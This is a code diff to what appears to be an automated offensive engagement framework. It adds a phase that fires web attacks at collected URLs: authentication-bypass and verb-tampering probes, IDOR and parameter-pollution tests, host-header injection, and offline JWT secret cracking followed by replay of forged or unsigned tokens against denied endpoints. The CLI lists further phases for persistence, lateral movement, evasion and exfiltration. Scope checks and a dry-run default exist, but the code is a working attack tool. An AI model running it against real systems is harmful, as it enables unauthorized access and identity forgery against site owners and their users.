@@ -371,6 +371,208 @@ class Engine:
                                         "kb": kb, "weapons": [w["name"] for w in weapons[:8]]})
         self.eng.save()
 
+    def phase_webattack(self):
+        """HTTP exploit primitives (the post-Cobblestone gap): auth-bypass
+        matrix, verb tampering, IDOR differential, host-header injection,
+        HPP, and JWT audit/forge — fired through the origin-bound transport,
+        one hypothesis per (url, family) with the lesson-19 lifecycle.
+
+        Dry-run renders the exact probe matrix without firing; --go executes.
+        The JWT offline audit always runs — it touches no network.
+        """
+        self.eng.set_phase("webattack")
+        from . import webattack, hypothesis
+        urls = []
+        for t in self.eng.state.get("targets", []):
+            for u in t.get("urls", []):
+                if u.get("url"):
+                    urls.append((u["url"], u.get("status") or 0))
+        urls = list(dict.fromkeys(urls))
+        # held tokens: JWT-shaped credentials get audited offline regardless
+        tokens = []
+        for c in self.eng.state.get("credentials", []):
+            v = c.get("value", "")
+            if c.get("type") in ("jwt", "bearer", "token") or v.count(".") == 2:
+                tokens.append((v, c.get("source") or "held"))
+        # ---- JWT offline audit: always runs, zero network ----
+        for tok, source in tokens:
+            audit = webattack.jwt_audit(tok)
+            if not audit.get("valid"):
+                continue
+            for fl in audit.get("flags", []):
+                self.eng.log(f"jwt[{source}]: {fl['flag']} — {fl['detail']}",
+                             "warn" if fl["severity"] in ("critical", "high")
+                             else "info")
+                if fl["flag"] == "weak-secret" and not any(
+                        f.get("class") == "jwt-weak-secret" and
+                        f.get("target") == source
+                        for f in self.eng.state.get("findings", [])):
+                    self.eng.add_finding(
+                        "JWT HMAC secret brute-forced offline", "high",
+                        "jwt-weak-secret", webattack.HIT_TECHNIQUE["jwt"],
+                        source, evidence=[fl["detail"]],
+                        detail=f"alg={audit['alg']} — any identity forgeable",
+                        impact="full token forgery: any user, any role, "
+                               "no network interaction required",
+                        remediation="use a high-entropy secret (>=256 bits) "
+                                    "and rotate every issued token")
+        if not urls:
+            self.eng.log("webattack: no URLs in state — recon first", "warn")
+            self.eng.save()
+            return
+        # ---- the probe matrix ----
+        from urllib.parse import urlparse, parse_qsl
+        contexts = ["anon"] + [c for c in
+                               self.eng.state.get("http_contexts", [])
+                               if c != "anon"]
+        matrix = []
+        for url, status in urls:
+            if not self.scope.in_scope(url):
+                self.eng.log(f"skip {url}: out of scope", "warn")
+                continue
+            u = urlparse(url)
+            fams = ["verb-tamper"]
+            if status in (401, 403):
+                fams.append("auth-bypass")
+            if parse_qsl(u.query) or any(ch.isdigit() for ch in u.path):
+                fams.append("idor")
+            if parse_qsl(u.query):
+                fams.append("hpp")
+            matrix.append((url, status, fams))
+        if not self.go or self.mock:
+            total = sum(len(f) for _u, _s, f in matrix)
+            self.eng.log(f"webattack DRY-RUN: {len(matrix)} url(s), "
+                         f"{total} probe families, {len(tokens)} token(s) "
+                         f"audited — pass --go to fire", "warn")
+            self.eng.state.setdefault("notes", []).append(
+                {"ts": self.eng.state["updated"], "kind": "webattack-plan",
+                 "data": [{"url": u, "families": f} for u, _s, f in matrix][:40]})
+            self.eng.save()
+            return
+        from .http import OriginTransport, origin_of
+        transport = OriginTransport(timeout=10, insecure=True)
+        fam_fns = {
+            "verb-tamper": lambda u: webattack.verb_tamper(
+                transport, u, log=lambda m: self.eng.log(m, "action")),
+            "auth-bypass": lambda u: webattack.auth_bypass_matrix(
+                transport, u, log=lambda m: self.eng.log(m, "action")),
+            "idor": lambda u: webattack.idor_differential(
+                transport, u, contexts=contexts,
+                log=lambda m: self.eng.log(m, "action")),
+            "hpp": lambda u: webattack.hpp_probe(
+                transport, u, log=lambda m: self.eng.log(m, "action")),
+        }
+        for url, _status, fams in matrix:
+            for fam in fams:
+                theory = f"webattack::{fam}::{url}"
+                reason = hypothesis.tombstoned(
+                    url.split("://", 1)[-1].split("/")[0], theory)
+                if reason:
+                    self.eng.log(f"skip {theory}: TOMBSTONED — {reason}", "warn")
+                    continue
+                h = hypothesis.new_hypothesis(self.eng, theory,
+                                              host=url.split("://", 1)[-1]
+                                              .split("/")[0],
+                                              budget=2, cutoff=2,
+                                              detail=f"{fam} against {url}")
+                try:
+                    res = fam_fns[fam](url)
+                except Exception as e:
+                    self.eng.log(f"{fam} {url} failed: {e}", "err")
+                    hypothesis.probe_failed(self.eng, h["id"], note=str(e))
+                    continue
+                if res.get("hits"):
+                    hypothesis.note_evidence(
+                        self.eng, h["id"],
+                        f"{len(res['hits'])} hit(s) in {res.get('probes', 0)} probes")
+                    # one finding per (family, url) — all mutations land as
+                    # evidence, and a finding already on the books is never
+                    # duplicated across runs
+                    dup = any(f.get("class") == fam and f.get("target") == url
+                              for f in self.eng.state.get("findings", []))
+                    if not dup:
+                        sev = webattack.hit_severity(fam, url, res["hits"][0])
+                        evidence = [f"{x['mutation']}: {x['baseline']} -> "
+                                    f"{x['observed']}"
+                                    for x in res["hits"][:8]]
+                        evidence.append(res["hits"][0]["evidence"])
+                        self.eng.add_finding(
+                            f"{fam} on {url} ({len(res['hits'])} mutation(s))",
+                            sev, fam, webattack.HIT_TECHNIQUE[fam], url,
+                            evidence=evidence,
+                            detail=res["hits"][0]["evidence"],
+                            impact="access-control failure — chain into "
+                                   "data access or state change immediately",
+                            remediation="enforce authorization server-side "
+                                        "on every verb, header, and path form")
+                else:
+                    hypothesis.probe_failed(
+                        self.eng, h["id"],
+                        note=f"{fam}: 0 hits in {res.get('probes', 0)} probes")
+        # ---- host-header: once per origin ----
+        seen_origins = set()
+        for url, _s, _f in matrix:
+            org = origin_of(url)
+            if org in seen_origins:
+                continue
+            seen_origins.add(org)
+            res = webattack.host_header_injection(
+                transport, url, log=lambda m: self.eng.log(m, "action"))
+            if res.get("hits") and not any(
+                    f.get("class") == "host-header" and f.get("target") == org
+                    for f in self.eng.state.get("findings", [])):
+                self.eng.add_finding(
+                    f"host-header injection on {org}", "medium", "host-header",
+                    webattack.HIT_TECHNIQUE["host-header"], org,
+                    evidence=[x["evidence"] for x in res["hits"]] +
+                             [x["mutation"] for x in res["hits"]],
+                    detail=res["hits"][0]["evidence"],
+                    impact="password-reset poisoning / cache poisoning surface",
+                    remediation="pin an allowed Host list at the edge")
+        # ---- JWT forgery replay: fire the forgeries at denied endpoints ----
+        for tok, source in tokens:
+            audit = webattack.jwt_audit(tok)
+            if not audit.get("valid"):
+                continue
+            forgeries = list(webattack.jwt_forge_none(tok))
+            secret = next((f.get("secret") for f in audit["flags"]
+                           if f["flag"] == "weak-secret"), None)
+            if secret:
+                h, p, _s = webattack.jwt_split(tok)
+                si = (webattack._b64url_encode(json.dumps(h).encode()) + "." +
+                      webattack._b64url_encode(json.dumps(p).encode()))
+                forgeries.append(f"{si}.{webattack._jwt_sign_hmac(si, secret, h.get('alg', 'HS256'))}")
+            for url, status, _fams in matrix:
+                if status not in (401, 403):
+                    continue
+                base = transport.request("GET", url, context="anon")
+                for fg in forgeries[:6]:
+                    try:
+                        r = transport.request(
+                            "GET", url, context="anon",
+                            headers={"Authorization": f"Bearer {fg}"})
+                    except OSError:
+                        continue
+                    if r.get("status", 0) // 100 in (2, 3) and \
+                            webattack.differs(webattack.fingerprint(base),
+                                              webattack.fingerprint(r)) and \
+                            not any(f.get("class") == "jwt-forgery" and
+                                    f.get("target") == url
+                                    for f in self.eng.state.get("findings", [])):
+                        self.eng.add_finding(
+                            f"JWT forgery accepted on {url}", "critical",
+                            "jwt-forgery", webattack.HIT_TECHNIQUE["jwt"], url,
+                            evidence=[f"forged token answered {r.get('status')} "
+                                      f"where anon was {base.get('status')}",
+                                      f"source token: {source}"],
+                            detail="a forged/unsigned token is accepted — "
+                                   "identity fabrication proven, not theorized",
+                            impact="full authentication bypass as any identity",
+                            remediation="pin the accepted alg, require "
+                                        "signature verification, rotate secrets")
+                        break
+        self.eng.save()
+
     def phase_spray(self):
         """Token spray (lessons 11+17): every held credential automatically
         fired against every authenticated surface on the box — kubelet,
@@ -448,6 +650,8 @@ class Engine:
                     self.phase_plan()
                 elif phase == "attack":
                     self.phase_attack()
+                elif phase == "webattack":
+                    self.phase_webattack()
                 elif phase == "spray":
                     self.phase_spray()
                 elif phase == "report":
@@ -673,7 +877,7 @@ def build_arg_parser(sub):
     rp = sub.add_parser("run", help="run engagement phases")
     rp.add_argument("dir", help="engagement folder")
     rp.add_argument("--phases", default="", help="comma list: recon,analyze,plan,attack,"
-                    "escalate,persist,move,harvest,spray,evade,exfil,report")
+                    "webattack,escalate,persist,move,harvest,spray,evade,exfil,report")
     rp.add_argument("--go", action="store_true", help="EXECUTE atomic tests (default dry-run)")
     rp.add_argument("--mock", action="store_true")
     rp.add_argument("--wordlist", default=None, help="subdomain wordlist (default: builtin)")
